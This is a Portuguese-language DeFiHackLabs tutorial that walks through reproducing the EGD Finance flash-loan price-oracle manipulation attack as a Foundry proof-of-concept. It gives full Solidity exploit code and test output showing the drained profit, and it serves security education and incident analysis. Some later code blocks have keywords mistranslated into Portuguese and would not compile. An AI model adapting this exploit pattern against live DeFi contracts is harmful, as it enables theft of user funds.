# Depuração de Transações OnChain: 3. Escreva seu próprio PoC

Autor: [Ghost](https://twitter.com/h0wsO1)

No tutorial [01_Ferramentas](/Topics/Onchain_debug/01_tools/readme.md), aprendemos como usar as Ferramentas de Depuração para observar o processo de interação entre uma transação e um contrato inteligente.

No tutorial [02_Aquecimento](/Topics/Onchain_debug/02_warmup/readme.md), analisamos uma transação interagindo com uma DEX e usamos o Foundry para interagir com a DEX.

Neste tutorial, vamos te guiar na análise de um evento de ataque e, passo a passo, ajudá-lo a usar o framework de testes Foundry para escrever código e concluir a Reprodução do PoC.

## Por que é importante aprender a escrever um Reprodução PoC?

A DeFiHackLabs espera que mais pessoas possam se interessar pela segurança da Web3, para que, quando ocorrer um evento de ataque, mais pessoas possam analisar as causas do evento e contribuir para a segurança da rede.

1. Como parte da parte afetada, exercite a capacidade de resposta a incidentes.
2. Como parte atacante, desenvolva habilidades de análise de ameaças e escreva PoCs de recompensas por bugs para obter recompensas mais competitivas.
3. Ajude as equipes de defesa a ajustar melhor os modelos de aprendizado de máquina, como a [Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/).
4. Em vez de ler relatórios de autópsia de instituições de segurança, escrever sua própria Reprodução pode ajudar a entender melhor as estratégias de ataque dos hackers.
5. Exercite a familiaridade com a programação Solidity, pois a blockchain é essencialmente um grande banco de dados público.

## Conhecimentos necessários antes de aprender a escrever um Reprodução PoC

1. Compreender os padrões comuns de vulnerabilidades em contratos inteligentes, você pode praticar com [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs).
2. Compreender como funciona a infraestrutura básica da DeFi e como os contratos inteligentes interagem entre si.

## Breve introdução ao oráculo de preços

No mundo da blockchain, as variáveis de estado e os parâmetros dos contratos inteligentes estão isolados do mundo exterior, os contratos inteligentes não podem iniciar ações como aplicativos tradicionais, como inicialização automática ou busca de informações de preços por meio de APIs.

Para que um contrato inteligente obtenha dados externos, geralmente existem duas abordagens:

1. Ter uma entidade EOA que forneça ativamente o preço.
2. Usar um oráculo, ou seja, "consultar um parâmetro armazenado em um contrato inteligente como informação de preço".

Por exemplo: tenho um contrato de empréstimo que deseja obter o preço do ETH para determinar se a posição do mutuário pode ser liquidada, como posso fazer isso?

Neste exemplo, o preço do ETH é um dado externo.

Se o contrato de empréstimo deseja obter os dados de preço do ETH, ele pode obter as informações de preço do ETH do Uniswap V2.

Sabemos que no algoritmo AMM `x * y = k`, o preço do token x = `k / y`.

Portanto, se quisermos obter o preço do ETH, podemos encontrar o contrato do par de negociação Uniswap V2 WETH/USDC: `0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`.

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

No momento da redação deste artigo, os volumes de reserva deste contrato são:

WETH: `33,906.6145928` unidades
USDC: `42,346,768.252804` unidades

Aplicando a fórmula `x * y = k`, podemos saber o preço de cada unidade de ETH em USDC:

`42,346,768.252804 / 33,906.6145928 = 1248.9235`

(Há uma pequena diferença, geralmente representando receitas de taxas de transação ou tokens transferidos acidentalmente, que podem ser retirados com `skim()`)

Portanto, se um contrato de arbitragem deseja obter o preço do ETH, o pseudocódigo Solidity pode ser entendido aproximadamente como:

```solidity=
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```

> Por favor, note que esta abordagem pode ser facilmente manipulada para manipular os preços do oráculo, não faça isso em um ambiente de produção.

Se precisar entender mais sobre o algoritmo Uniswap V2, recomenda-se consultar [vídeos educativos de programação de contratos inteligentes](https://www.youtube.com/watch?v=Ar4Ik7Bov0U).

Se precisar entender mais sobre a manipulação de oráculos de preços, recomenda-se consultar [artigos educativos do WTFSolidity](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md).

## Exemplos reais de manipulação de preços

A maioria dos cenários de ataque envolve:

1. Troca de endereços de oráculo de preços
    - Causa fundamental: operações privilegiadas sem mecanismos de autenticação de identidade
    - Exemplo: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)
2. Atacantes usando empréstimos relâmpago para retirar instantaneamente a liquidez do oráculo, fornecendo informações de preço anormais ao contrato afetado
    - Essa vulnerabilidade é frequentemente explorada em funções críticas como GetPrice, Swap, StakingReward, Transfer (com taxa de queima)
    - Causa fundamental: o projeto usa um oráculo inseguro ou não implementou o preço médio ponderado no tempo (TWAP).
    - Exemplo: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

> Dicas: Ao revisar o código, é melhor prestar atenção se o uso de `balanceOf()` é rigoroso o suficiente.

## Passo a passo para escrever um PoC - Exemplo com EGD Finance

### Passo 1: Coleta de informações

Quando ocorre um ataque, o Twitter geralmente é o principal campo de batalha dos analistas de segurança, onde diversos especialistas compartilham suas descobertas mais recentes sobre o evento de ataque.

No início de um evento de ataque, geralmente há muita confusão, então é bom organizar as informações que você descobriu!

1. ID da transação
2. Endereço do atacante (EOA)
3. Endereço do contrato de ataque
4. Endereço vulnerável
5. Perda total
6. Links de referência
7. Links pós-mortem
8. Trecho vulnerável
9. Histórico de auditoria

> Dicas: Recomenda-se usar o modelo [Exploit-Template.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/script/Exploit-template.sol) fornecido pela DeFiHackLabs.

---

### Passo 2: Depuração da Transação

Com base em observações anteriores, aproximadamente 12 horas após o ataque, geralmente mais de 90% das análises de eventos de ataque são esclarecidas, então a análise manual da transação não será muito difícil nesse momento.

A razão pela qual escolhemos o EGD Finance como exemplo de ensino é:

1. Os leitores podem aprender sobre os riscos de manipulação de oráculos de preços em um ambiente real
2. Os leitores podem entender como os atacantes lucram com a manipulação de preços
3. Os leitores também podem aprender sobre o funcionamento dos empréstimos relâmpago
4. O atacante usa apenas uma transação para concluir o ataque, sem ações complexas anteriores, tornando a reprodução mais simples

Vamos analisar o evento de ataque do EGD Finance usando a ferramenta Phalcon desenvolvida pela Blocksec, [link para análise](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3).

<img width="1736" alt="PhalconOverview" src="https://user-images.githubusercontent.com/26408530/211231413-25e31110-4e3a-41c7-9dbb-d9fdc3a0e8da.png">

Na Máquina Virtual Ethereum, você verá três tipos de chamadas:

1. Call: uma forma comum de chamada de função entre contratos, que geralmente altera o armazenamento do contrato chamado
2. StaticCall: chamada estática, que não altera o armazenamento do contrato chamado, é usada para ler variáveis de estado entre contratos
3. DelegateCall: chamada de delegação, `msg.sender` não é alterado, geralmente usado em padrões de proxy, mais detalhes podem ser encontrados no [tutorial WTFSolidity](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall).

Por favor, note que a chamada de função interna não é visível.

---

O padrão de ataque de empréstimo relâmpago geralmente é o seguinte:

1. Confirmar o saldo que pode ser emprestado da DEX e garantir que o contrato afetado tenha saldo suficiente para que o atacante lucre
    - Isso significa que haverá algumas chamadas estáticas na primeira metade da transação
2. Chamar a função de empréstimo, recebendo um empréstimo relâmpago da DEX ou do Protocolo de Empréstimo
    - Pontos-chave: procure as seguintes chamadas de função
    - UniswapV2, Pancakeswap: `.swap()`
    - Balancer: `flashLoan()`
    - DODO: `.flashloan()`
    - AAVE: `.flashLoan()`
3. O protocolo de empréstimo chama de volta o contrato do atacante
    - Pontos-chave: procure as seguintes chamadas de função
    - UniswapV2: `.uniswapV2Call()`
    - Pancakeswap: `.Pancakeswap()`
    - Balancer: `.receiveFlashLoan()`
    - DODO: `.DXXFlashLoanCall()`
    - AAVE: `.executeOperation()`
4. O atacante interage com o contrato afetado, lucrando com a vulnerabilidade
5. Repagamento do empréstimo relâmpago
    - Repagamento ativo
    - Definir a aprovação para permitir que o protocolo de empréstimo use `transferFrom()` para retirar o empréstimo.

Pequeno exercício: você consegue identificar em que estágios da transação de exploração do EGD Finance estão os estágios de empréstimo relâmpago, chamadas de retorno, exploração de vulnerabilidades e lucro?

`Expandir Nível: 3`

https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

> Dicas: Durante a prática, se você não conseguir entender a lógica de ataque da transação inteira, tente primeiro copiar os passos do atacante passo a passo, faça muitas anotações e depois volte para organizar a lógica do atacante.

<details><summary>Resposta</summary>

<img width="1898" alt="TryToDecodeFromYourEyesAnwser" src="https://user-images.githubusercontent.com/26408530/211231457-74b3ba87-45fc-4fe0-ace2-678247f00f58.png">

</details>

---

Até agora, temos um esboço inicial da transação de ataque, vamos concluir parte do código de Reprodução com base nas descobertas atuais:

Passo 1. Concluir fixtures

<details><summary>Clique para expandir o código</summary>

```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Perdido: ~36,044 US$
// Atacante: 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Contrato de Ataque: 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Contrato Vulnerável: 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Contrato Vulnerável: 0x93c175439726797dcee24d08e4ac9164e88e7aee (Lógica)
// Tx de Ataque: https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Código do Contrato Vulnerável: https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Tx de Stake: https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Análise
// Blocksec: https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield: https://twitter.com/PeckShieldAlert/status/1556486817406283776

// Declarar variáveis globais, devem ser do tipo constante
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // Simulador do atacante (EOA)
    Exploit exploit = new Exploit();

    constructor() { // Também pode ser escrito como function setUp() public {}
        // label pode rotular o endereço da carteira, facilitando a leitura com forge test -vvvv
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //Atenção: é necessário bifurcar o bloco anterior à transação de ataque, pois o estado do contrato afetado ainda não foi alterado!!
        console.log("-------------------------------- Iniciar Exploit ----------------------------------");
    }
}
```

</details>
<br>

Passo 2. Simulando o atacante chamando a função harvest

<details><summary>Clique para ver o código</summary>

```solidity=
contract Attacker is Test { // Simulando o atacante (EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // label pode rotular endereços de carteira para facilitar a leitura ao usar forge test -vvvv
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //Atenção: é necessário fazer fork do bloco anterior ao ataque tx, pois o estado do contrato vulnerável ainda não foi alterado!!
        console.log("-------------------------------- Início do Exploit ----------------------------------");
    }
 
    function testExploit() public { // Deve começar com test para que o Foundry execute o testcase
        // Antes do ataque, imprime o saldo para melhor observar a mudança de saldo
        emit log_named_decimal_uint("[Início] Saldo USDT do Atacante", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] Preço EGD/USDT antes da manipulação de preço", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Recompensa atual (token EGD) ganha", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Atacante manipulando o oráculo de preço do EGD Finance...");
        exploit.harvest(); //Simula a chamada do atacante ao contrato de ataque
        console.log("-------------------------------- Fim do Exploit ----------------------------------");
        emit log_named_decimal_uint("[Fim] Saldo USDT do Atacante", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```

</details>
<br>

Passo 3. Concluindo parte do contrato de ataque

<details><summary>Clique para ver o código</summary>

```solidity=
/* Contrato 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // Contrato de ataque
    uint256 borrow1;

    function harvest() public {        
        console.log("Flashloan[1] : empréstimo de 2.000 USDT do reservatório USDT/WBNB LPPool");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] pagamento bem-sucedido");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Lucro obtido
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] recebido");

        // Exploração da vulnerabilidade...

        // Exploração da vulnerabilidade concluída, troca dos tokens EGD roubados por USDT
        console.log("Trocar o lucro...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //Atacante paga de volta 2.000 USDT + 0,5% de taxa de serviço
        require(suc, "Falha no pagamento do Flashloan[1]");
    }
}
```

</details>
<br>

Vamos continuar analisando a parte crucial da exploração de vulnerabilidades...

Podemos ver que na parte de exploração de vulnerabilidades, o atacante mais uma vez chamou `Pancakeswap.swap()`, aparentemente realizando um segundo flashloan:

![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

Você pode estar se perguntando: como o atacante consegue executar lógicas de código diferentes em duas chamadas de retorno, se o Pancakeswap é chamado através da interface `.pancakeCall()`?

A chave está no primeiro flashloan, onde o contrato de ataque passa `callbackData` como `0x0000`

![FlashloanCallbackData1](https://user-images.githubusercontent.com/26408530/211231501-7b8e508a-a6fe-4f28-9308-5406d0dec32f.png)

Enquanto no segundo flashloan, o contrato de ataque passa `callbackData` como `0x00`

![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)

Dessa forma, o contrato de ataque só precisa verificar se o parâmetro `_data` é 0x0000 ou 0x00 para executar lógicas de código diferentes.

Vamos continuar analisando a lógica de execução do callback do segundo flashloan.

No callback do segundo flashloan, o atacante interage com a EGD Finance, chamando apenas a função `claimAllReward()`:

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

Ao expandir o `claimAllReward()`, descobrimos que a EGD Finance apenas lê o saldo de tokens EGD e USDT do `0xa361-Cake-LP` e transfere uma grande quantidade de tokens EGD para o contrato de ataque!

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>O que é o contrato 0xa361-Cake-LP?</summary>

Podemos verificar no Etherscan qual par de negociação o contrato `0xa361-Cake-LP` representa.

Método 1: Verificar os dois tokens com maior reserva diretamente no [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d) (rápido)

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)

Método 2: [Read Contract](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract) para verificar os endereços dos tokens 0 e 1 (preciso)

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

Agora sabemos que `0xa361-Cake-LP` se refere ao contrato do par de negociação EGD/USDT.

</details>
<br>

Vamos analisar a função `claimAllReward()` para identificar onde está a vulnerabilidade.

<img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png">

Podemos observar que a quantidade de recompensa de Staking recebida pelo usuário depende do fator de recompensa `quota` (representando quanto tempo e quantos tokens o usuário fez Staking) multiplicado pelo preço atual do token EGD em `getEGDPrice()`.

Em outras palavras, a recompensa de Staking em EGD fornecida pelo contrato será maior ou menor dependendo do preço atual do token EGD, **quanto maior o preço do token EGD, menor a quantidade de tokens EGD fornecida, e quanto menor o preço do token EGD, maior a quantidade de tokens EGD fornecida**.

Vamos analisar a função `getEGDPrice()` para entender o mecanismo de preço.

Você pode ver que o mecanismo de alimentação de preços usa a fórmula `x * y = k`, como descrito em nossa introdução ao ***Princípio do Oráculo de Preços***.

O endereço do `par` é `0xa361-Cake-LP`, que pode ser associado às duas chamadas STATICCALL que vemos no Tx View.

Então, como exatamente os atacantes aproveitam essa referência de preço insegura para manipular os preços?

O princípio é que, ao realizar um empréstimo relâmpago de segunda camada, o atacante empresta USDT para o `Par EGD/USDT`; antes que o atacante pague de volta, as informações de preço obtidas pelo `getEGDPrice()` serão incorretas.

Consulte o diagrama ilustrativo:

**Resumo: Através de empréstimos relâmpago, os atacantes retiram a liquidez do oráculo de preços, fazendo com que o `ClaimReward()` obtenha uma referência de preço incorreta, permitindo assim que os atacantes recebam uma quantidade anormalmente grande de tokens EGD.**

Após obter uma grande quantidade de tokens EGD por meio da vulnerabilidade, os atacantes trocam os tokens EGD de volta por USDT por meio do Pancakeswap, realizando o lucro.

---

Até agora, analisamos completamente o princípio do ataque. Vamos concluir o Código de Reprodução:

Passo 4. Concluir a lógica do primeiro empréstimo relâmpago

<details><summary>Clique para expandir o código</summary>

```solidity=
/* Contrato 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contrato Exploit é Test{ // Contrato de ataque
    uint256 emprestimo1;
    uint256 emprestimo2;


    function harvest() public {        
        console.log("Flashloan[1] : emprestar 2.000 USDT do pool de reserva USDT/WBNB");
        emprestimo1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(emprestimo1, 0, address(this), "0000");
        console.log("Flashloan[1] pagamento bem-sucedido");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // Concluir o lucro
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] recebido");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] recebido");

            console.log("Flashloan[2] : emprestar 99.99999925% USDT do pool de reserva EGD/USDT");
            emprestimo2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; // Atacante empresta 99.99999925% da liquidez USDT do EGD_USDT_LPPool
            EGD_USDT_LPPool.swap(0, emprestimo2, address(this), "00"); // Empréstimo Flashloan[2]
            console.log("Flashloan[2] pagamento bem-sucedido");

            // Exploração da vulnerabilidade concluída, trocar os tokens EGD roubados por USDT
            console.log("Trocar o lucro...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); // Atacante paga de volta 2.000 USDT + 0.5% de taxa de serviço
            require(suc, "Falha no pagamento do Flashloan[1]");
        } else {
            console.log("Flashloan[2] recebido");
            // Exploração da vulnerabilidade...
        }


    }
}
```

</details>
<br>

Passo 5. Conclua o código lógico para a segunda exploração de empréstimo relâmpago (exploit)

<details><summary>Clique para ver o código</summary>

```solidity=
/* Contrato 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contrato Exploit é Test{ // Contrato de ataque
    uint256 emprestimo1;
    uint256 emprestimo2;


    function harvest() public {        
        console.log("Flashloan[1] : emprestou 2.000 USDT do reservatório USDT/WBNB LPPool");
        emprestimo1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(emprestimo1, 0, address(this), "0000");
        console.log("Flashloan[1] pagamento bem-sucedido");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // Lucro obtido
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] recebido");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] recebido");

            console.log("Flashloan[2] : emprestou 99.99999925% USDT do reservatório EGD/USDT LPPool");
            emprestimo2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; // Atacante empresta 99.99999925% do USDT da liquidez EGD_USDT_LPPool
            EGD_USDT_LPPool.swap(0, emprestimo2, address(this), "00"); // Empréstimo Flashloan[2]
            console.log("Flashloan[2] pagamento bem-sucedido");

            // Exploração do exploit concluída, trocando os tokens EGD roubados por USDT
            console.log("Trocar o lucro...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); // Atacante paga de volta 2.000 USDT + 0.5% de taxa de serviço
            require(suc, "Falha no pagamento do Flashloan[1]");
        } else {
            console.log("Flashloan[2] recebido");
            emit log_named_decimal_uint("[INFO] Preço EGD/USDT após manipulação de preço", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Reivindicar todas as recompensas de token EGD do contrato EGD Finance");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Obter recompensa (token EGD)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 taxaTroca = amount1 * 3 / 1000;   // Atacante paga 0.3% de taxa para a Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+taxaTroca);
            require(suc, "Falha no pagamento do Flashloan[2]");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

Se tudo correr bem, o comando `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv` mostrará que a execução do Reproduce e o saldo foram alterados.

[DeFiHackLabs - EGD-Finance.exp.sol](/src/test/EGD-Finance.exp.sol)

```
Executando 1 teste para src/test/EGD-Finance.exp.sol:Atacante
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Preparação, apostando 10 USDT no EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Atacante aposta 10 USDT no EGD Finance
  -------------------------------- Início do Exploit ----------------------------------
  [Início] Saldo USDT do Atacante: 0.000000000000000000
  [INFO] Preço EGD/USDT antes da manipulação de preço: 0.008096310933284567
  [INFO] Recompensa atual (token EGD): 0.000341874999999972
  Atacante manipulando o oráculo de preço do EGD Finance...
  Flashloan[1] : emprestou 2.000 USDT do reservatório USDT/WBNB LPPool
  Flashloan[1] recebido
  Flashloan[2] : emprestou 99.99999925% USDT do reservatório EGD/USDT LPPool
  Flashloan[2] recebido
  [INFO] Preço EGD/USDT após manipulação de preço: 0.000000000060722331
  Reivindicar todas as recompensas de token EGD do contrato EGD Finance
  [INFO] Obter recompensa (token EGD): 5630136.300267721935770000
  Flashloan[2] pagamento bem-sucedido
  Trocar o lucro...
  Flashloan[1] pagamento bem-sucedido
  -------------------------------- Fim do Exploit ----------------------------------
  [Fim] Saldo USDT do Atacante: 18062.915446991996902763

Resultado do teste: ok. 1 passou; 0 falhou; concluído em 1.66s
```

> Nota: O EGD-Finance.exp.sol fornecido pela DeFiHackLabs possui uma tarefa de Stacking prévia para reproduzir o atacante.
>
> Este tutorial não cobre as ações prévias, você pode praticar por conta própria!
> Tx de Stack do Atacante: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

A terceira lição termina aqui, se quiser aprender mais, pode consultar os recursos de aprendizado abaixo.

---
## Recursos de Aprendizado
[samczsun's eth txn explorer e extensão vscode](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilidades em DeFi por Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Depurar Transação](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversão do EVM: Calldata Bruto](https://degatchi.com/articles/reading-raw-evm-calldata)

https://web3sec.xrex.io/